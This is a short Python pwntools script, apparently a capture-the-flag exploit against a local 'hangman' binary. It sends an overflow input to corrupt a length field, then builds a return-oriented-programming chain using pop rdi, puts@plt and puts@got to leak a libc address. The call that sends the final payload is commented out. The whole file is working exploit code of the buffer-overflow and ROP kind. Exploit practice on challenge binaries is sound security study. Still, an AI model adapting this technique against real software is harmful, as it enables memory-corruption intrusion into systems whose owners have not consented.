from pwn import *
target=process('./hangman')
context.terminal=["tmux","split","-h"]
#gdb.attach(target,gdbscript="b *0x401712")

def guessword(word):
    print(target.recvuntil("choice: "))
    target.sendline("2")
    print(target.recvuntil("word: "))
    target.sendline(word)

def filler():
    print(target.recvuntil("choice: "))
    target.sendline("2")

payload1="9"*32+"\xff"
guessword(payload1)

for i in range(32):
    print(str(i))
    filler()

poprdi=0x4019a3

payload="A"*64
puts_plt=0x401050
puts_got=0x404028
restart=0x401894

payload+=p64(poprdi)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(restart)

#guessword(payload)
#pause()
target.interactive()
